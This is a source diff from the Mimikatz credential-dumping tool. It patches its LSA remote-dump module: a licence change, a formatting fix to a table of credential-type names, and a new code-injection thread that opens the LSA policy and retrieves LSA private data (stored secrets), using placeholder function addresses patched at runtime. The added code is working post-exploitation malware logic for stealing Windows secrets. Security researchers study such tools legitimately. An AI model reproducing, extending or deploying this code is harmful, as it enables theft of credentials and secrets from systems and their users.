@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_lsadump_remote.h"
 
@@ -17,7 +17,7 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 		{0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054}, // CLEARTEXT
 		{0x00440057, 0x00670069, 0x00730065, 0x00000074}, // WDigest
 		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x00000000}, // Kerberos
-		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065,0x00000073}, // Kerberos-Newer-Keys
+		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065, 0x00000073}, // Kerberos-Newer-Keys
 		};
 	UNICODE_STRING knu[] = {
 		{18, 18, (PWSTR) kn[0]},
@@ -86,4 +86,28 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 	return STATUS_SUCCESS;
 }
 DWORD kuhl_sekurlsa_samsrv_thread_end(){return 'lsar';}
+#ifdef LSARPDATA
+DWORD WINAPI kuhl_lsadump_RetrievePrivateData_thread(PREMOTE_LIB_DATA lpParameter)
+{
+	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
+	LSA_HANDLE hPolicy;
+	LSA_UNICODE_STRING uInputString = {(USHORT) lpParameter->input.inputSize, (USHORT) lpParameter->input.inputSize, (PWSTR) lpParameter->input.inputData}, *uOutString;
+
+
+	if(NT_SUCCESS(((PLSAOPENPOLICY) 0x4141414141414141)(NULL, &oaLsa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy)))
+	{
+		lpParameter->output.outputStatus = ((PLSARETRIEVEPRIVATEDATA) 0x4444444444444444)(hPolicy, &uInputString, &uOutString);
+		if(NT_SUCCESS(lpParameter->output.outputStatus))
+		{
+			lpParameter->output.outputSize = uOutString->Length;
+			if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
+				((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(lpParameter->output.outputData, uOutString->Buffer, lpParameter->output.outputSize);
+			((PLSAFREEMEMORY) 0x4343434343434343)(uOutString);
+		}
+		((PLSACLOSE) 0x4242424242424242)(hPolicy);
+	}
+	return STATUS_SUCCESS;
+}
+DWORD kuhl_lsadump_RetrievePrivateData_thread_end(){return 'lsap';}
+#endif
 #pragma optimize("", on)
